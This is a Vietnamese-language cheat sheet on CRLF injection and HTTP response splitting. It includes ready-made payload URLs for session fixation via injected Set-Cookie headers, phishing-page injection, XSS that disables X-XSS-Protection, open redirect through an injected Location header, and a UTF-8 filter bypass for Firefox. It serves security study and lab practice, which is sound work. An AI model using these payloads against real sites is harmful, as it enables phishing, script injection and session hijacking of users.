# Carriage Return Line Feed

> CRLF Injection là một lỗ hổng bảo mật web xảy ra khi kẻ tấn công chèn các ký tự Carriage Return (CR) (\r) và Line Feed (LF) (\n) không mong muốn vào một ứng dụng. Các ký tự này được sử dụng để đánh dấu kết thúc một dòng và bắt đầu một dòng mới trong các giao thức mạng như HTTP, SMTP, và các giao thức khác. Trong giao thức HTTP, chuỗi CR-LF luôn được sử dụng để kết thúc một dòng.

## Tóm tắt

* [Phương pháp](#methodology)
    * [Session Fixation](#session-fixation)
    * [Cross Site Scripting](#cross-site-scripting)
    * [Open Redirect](#open-redirect)
* [Bypass bộ lọc](#filter-bypass)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Phương pháp

HTTP Response Splitting là một lỗ hổng bảo mật trong đó kẻ tấn công thao túng một phản hồi HTTP bằng cách chèn các ký tự Carriage Return (CR) và Line Feed (LF) (gọi chung là CRLF) vào một header phản hồi. Các ký tự này đánh dấu kết thúc một header và bắt đầu một dòng mới trong các phản hồi HTTP.

**Các ký tự CRLF**:

* `CR` (`\r`, ASCII 13): Di chuyển con trỏ về đầu dòng.
* `LF` (`\n`, ASCII 10): Di chuyển con trỏ xuống dòng tiếp theo.

Bằng cách chèn một chuỗi CRLF, kẻ tấn công có thể chia phản hồi thành hai phần, từ đó kiểm soát hiệu quả cấu trúc của phản hồi HTTP. Điều này có thể dẫn đến nhiều vấn đề bảo mật khác nhau, chẳng hạn như:

* Cross-Site Scripting (XSS): Chèn các script độc hại vào phần phản hồi thứ hai.
* Cache Poisoning: Buộc nội dung sai lệch được lưu trữ trong bộ nhớ đệm.
* Header Manipulation: Thay đổi các header để đánh lừa người dùng hoặc hệ thống

### Session Fixation

Một header phản hồi HTTP điển hình trông như sau:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

Nếu dữ liệu đầu vào của người dùng `value\r\nSet-Cookie: admin=true` được nhúng vào các header mà không được làm sạch (sanitize):

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Bây giờ kẻ tấn công đã tự đặt cookie của riêng mình.

### Cross Site Scripting

Bên cạnh session fixation vốn đòi hỏi một cách xử lý phiên người dùng rất thiếu an toàn, cách khai thác CRLF injection dễ nhất là viết lại nội dung (body) mới cho trang. Nó có thể được dùng để tạo một trang phishing hoặc để kích hoạt một đoạn mã Javascript tùy ý (XSS).

**Trang được yêu cầu**:

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

**Phản hồi HTTP**:

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

Trong trường hợp XSS, việc chèn CRLF cho phép chèn header `X-XSS-Protection` với giá trị "0", để vô hiệu hóa nó. Sau đó chúng ta có thể thêm thẻ HTML chứa mã Javascript.

**Trang được yêu cầu**:

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**Phản hồi HTTP**:

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### Open Redirect

Chèn một header `Location` để buộc chuyển hướng người dùng.

```ps1
%0d%0aLocation:%20http://myweb.com
```

## Bypass bộ lọc

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) quy định rằng hầu hết các giá trị header HTTP chỉ sử dụng một tập con của bảng mã US-ASCII.

> Các trường header mới được định nghĩa NÊN giới hạn giá trị của chúng trong các octet US-ASCII.

Firefox tuân theo quy định này bằng cách loại bỏ bất kỳ ký tự nào nằm ngoài phạm vi khi thiết lập cookie thay vì mã hóa chúng.

| Ký tự UTF-8 | Hex         | Unicode  | Bị loại bỏ   |
| --------------- | ----------- | -------- | ---------- |
| `嘊`            | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍`            | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾`            | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼`            | `%E5%98%BC` | `\u563c` | `%3C` (<)  |

Ký tự UTF-8 `嘊` chứa `0a` ở phần cuối của định dạng hex, ký tự này sẽ được Firefox chuyển đổi thành `\n`.

Một payload mẫu sử dụng các ký tự UTF-8 sẽ là:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

Phiên bản đã mã hóa URL

```js
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## Tài liệu tham khảo

* [CRLF Injection - CWE-93 - OWASP - 20 tháng 5, 2022](https://web.archive.org/web/20200113055606/https://www.owasp.org/index.php/CRLF_Injection)
* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - 21 tháng 4, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - 20 tháng 12, 2016](https://vulners.com/hackerone/H1:192749)
